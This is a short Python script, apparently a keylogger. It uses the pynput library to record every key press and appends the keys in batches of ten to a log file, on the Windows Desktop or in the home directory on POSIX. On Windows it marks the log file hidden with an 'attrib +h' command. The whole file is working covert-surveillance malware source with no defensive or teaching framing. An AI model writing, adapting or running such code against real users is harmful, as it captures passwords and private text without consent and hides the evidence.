import pynput
import os
from pynput.keyboard import Key, Listener
import getpass

keys = []
count = 0
user = getpass.getuser()
path_nt = f"C:/Users/{user}/Desktop/log.txt"
path_posix = "~/log.txt"

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    if os.name == "nt":
        os.system(f'attrib +h {path_nt}')
        for key in keys:
            with open(path_nt, "a") as log:
                log.write(str(key) + "\n")
    if os.name == "posix":
        for key in keys:
            with open(path_posix, "a") as log:
                log.write(str(key) + "\n") 


def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()